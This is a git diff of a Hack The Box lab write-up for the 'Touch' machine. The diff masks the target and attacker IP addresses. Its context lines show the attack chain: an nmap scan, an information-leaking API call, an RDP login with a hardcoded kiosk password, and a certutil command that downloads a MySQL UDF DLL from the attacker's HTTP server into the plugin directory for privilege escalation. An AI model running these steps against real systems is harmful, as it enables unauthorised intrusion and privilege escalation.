@@ -24,8 +24,8 @@
 | :--- | :--- |
 | **Machine Name** | Touch |
 | **Operating System** | Windows 11 / Server 2025 |
-| **Target IP** | `10.129.11.9` |
-| **Attacker IP** | `10.10.14.25` |
+| **Target IP** | `10.129.x.x` |
+| **Attacker IP** | `10.10.x.x` |
 | **Difficulty** | Easy |
 | **Points** | 20 |
 | **Attack Chain** | Information Disclosure → Kiosk Breakout → Hardcoded Credentials → MySQL UDF Privilege Escalation |
@@ -37,7 +37,7 @@
 Initial enumeration was performed using `nmap` to identify open ports and running services:
 
 ~~~bash
-nmap -p- -sV -sC -Pn 10.129.11.9
+nmap -p- -sV -sC -Pn 10.129.x.x
 ~~~
 
 ### Key Findings
@@ -60,7 +60,7 @@ The custom web application running on port `8443` became the primary attack vect
 Enumerating the web application revealed an unauthenticated `/api/status` endpoint that leaked sensitive device information:
 
 ~~~bash
-curl -k https://10.129.11.9:8443/api/status
+curl -k https://10.129.x.x:8443/api/status
 ~~~
 
 The endpoint returned:
@@ -84,7 +84,7 @@ The exposed serial number became useful for further authentication.
 Navigating to:
 
 ~~~text
-https://10.129.11.9:8443
+https://10.129.x.x:8443
 ~~~
 
 presented a login panel.
@@ -109,7 +109,7 @@ Password: K!0sk2026#
 Using the harvested credentials, an RDP session was established:
 
 ~~~bash
-xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.11.9 /size:1280x800 /dynamic-resolution
+xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.x.x /size:1280x800 /dynamic-resolution
 ~~~
 
 The session initially launched into a restricted HTB Airways Kiosk application.
@@ -202,7 +202,7 @@ python3 -m http.server 8000
 From the Windows target:
 
 ~~~cmd
-certutil -urlcache -f http://10.10.14.25:8000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
+certutil -urlcache -f http://10.10.x.x:8000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
 ~~~
 
 The DLL was written directly into the writable MySQL plugin directory.
